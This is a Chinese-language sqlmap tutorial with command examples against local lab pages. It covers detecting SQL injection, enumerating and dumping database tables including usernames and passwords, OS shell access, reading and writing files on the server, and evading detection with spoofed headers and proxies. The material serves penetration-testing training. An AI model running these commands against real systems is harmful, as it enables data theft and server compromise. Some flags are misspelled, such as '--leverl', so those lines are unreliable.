---
title: Sqlmap的使用
---

# Sqlmap的使用

## sqlmap下载

windows版

[https://github.com/sqlmapproject/sqlmap/zipball/master](https://github.com/sqlmapproject/sqlmap/zipball/master)

linux版

[https://github.com/sqlmapproject/sqlmap/tarball/master](https://github.com/sqlmapproject/sqlmap/tarball/master)

## 基础篇

1、判断是否存在注入

```bash
python sqlmap.py -u http://127.0.0.1/sql1/less-1/?id=1 #注入点后面的参数大于等于两个时加双引号
```

2、 判断文本是否存在注入(bp抓post包)

```bash
python sqlmap.py -r desktop/1.txt  --dbs --batch //文本路径，一般放在桌面直接扫描
```

3、查询当前用户下所有数据库

```bash
python sqlmap.py -u http://127.0.0.1/sql1/less-1/?id=1 --dbs #继续查询时--dbs缩写成-D
```

4、获取指定数据库中的表名

```bash
python sqlmap.py -u "http://127.0.0.1/sql1/union.php?id=1" -D dkeye --tables #继续查询时--tables缩写成-T
```

5、获取表中的字段名

```bash
python sqlmap.py -u "http://127.0.0.1/sql1/union.php?id=1" -D dkeye -T user_info --columns #继续查询时--columns缩写成-C
```

6、获取字段内容

```bash
python sqlmap.py -u "http://127.0.0.1/sql1/union.php?id=1" -D dkeye -T user_info -C username,password --dump
```

7、获取数据库中所有的用户(当前用户有权限读取包含所有用户的表的权限时使用就可以列出所有管理用户)

```bash
python sqlmap.py -u "http://127.0.0.1/sql1/nuion.php?id=1"  --users
```

8、获取数据库用户的密码(一般是mysql5加密----www.cmd5.com中解密)

```bash
python sqlmap.py -u "http://127.0.0.1/sql1/nuion.php?id=1" --passwords 
```

9、获取当前网站数据库的名称和用户名称

```bash
python sqlmap.py -u "http://127.0.0.1/sql1/nuion.php?id=1" --current-db
python sqlmap.py -u "http://127.0.0.1/sql1/nuion.php?id=1" --current-user
```

## 进阶篇

1、--leverl 5：探测等级，默认为1，为2时会自动测试http cookie,为3时测试http user-agent/referer

```bash
python sqlmap.py -u "http://127.0.0.1/sql1/nuion.php?id=1" --leverl 5
```

2、查看是否为管理员权限

```bash
python sqlmap.py -u "http://127.0.0.1/sql1/nuion.php?id=1" --is-dba
```

3、列出数据库管理员角色（有权限读取所有用户的表，仅仅适用于当前数据库是Oracle的时候）

```bash
python sqlmap.py -u "http://127.0.0.1/sql1/nuion.php?id=1" --roles
```

4、伪造referer

```bash
--referer http://www.baidu.com
```

5、运行自定义的sql语句

```bash
python sqlmap.py -u "http://127.0.0.1/sql1/nuion.php?id=1" --sql-shell
```

6、执行任意操作系统命令

```bash
--os-cmd --os-shell
```

7、从数据库服务器中读取文件

```shell
python sqlmap.py -u "url" \ --file-read "C:/exaple.exe" -v 1
```

8、上传文件到数据库服务器中(将本地的test.txt文件上传到目标服务器的C:/windows/temp下并重命名为hack.txt)

```shell
python sqlmap.py -u "url" --file-write \ test.txt --file-dest "C:/windows/temp/hack.txt" -v 1
```

9、指定数据库、任意User-Agent爆破、代理爆破

```bash
python sqlmap.py -u "http://127.0.0.1/sqli/Less-4/?id=1" --dbms=mysql     #指定其数据库为mysql
python sqlmap.py -u "http://127.0.0.1/sqli/Less-4/?id=1" --random-agent   #使用任意的User-Agent爆破
python sqlmap.py -u "http://127.0.0.1/sqli/Less-4/?id=1" --proxy=PROXY    #使用代理进行爆破
-p username  #指定参数，当有多个参数而你又知道username参数存在SQL漏洞，你就可以使用-p指定参数进行探测
```

## 超进阶

tamper绕过脚本的编写，官方自带53个，但远远不够，这里就不往下写了，多读书多用就好了